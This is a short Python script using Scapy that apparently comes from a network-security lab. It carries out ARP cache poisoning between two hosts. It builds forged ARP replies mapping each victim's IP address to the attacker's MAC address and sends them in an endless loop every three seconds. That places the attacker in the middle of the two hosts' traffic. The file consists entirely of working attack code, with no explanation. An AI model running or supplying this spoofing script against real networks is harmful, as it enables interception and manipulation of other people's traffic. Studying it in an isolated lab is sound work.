#!/user/bin/env python3
from scapy.all import *

A_ip = "10.9.0.5"
A_mac = "02:42:0a:09:00:05"
B_ip = "10.9.0.6"
B_mac = "02:42:0a:09:00:06"
M_ip = "10.9.0.105"
M_mac = "02:42:0a:09:00:69"

#to A
eth=Ether(src=M_mac,dst=A_mac)
arp=ARP(hwsrc=M_mac,hwdst=A_mac,psrc=B_ip,pdst=A_ip)
arp.op=2
pkt1=eth/arp

#to B
e=Ether(src=M_mac,dst=B_mac)
a=ARP(hwsrc=M_mac,hwdst=B_mac,psrc=A_ip,pdst=B_ip)
a.op=2
pkt2=e/a


while True:
   sendp(pkt1,count=1)
   sendp(pkt2,count=1)
   time.sleep(3)
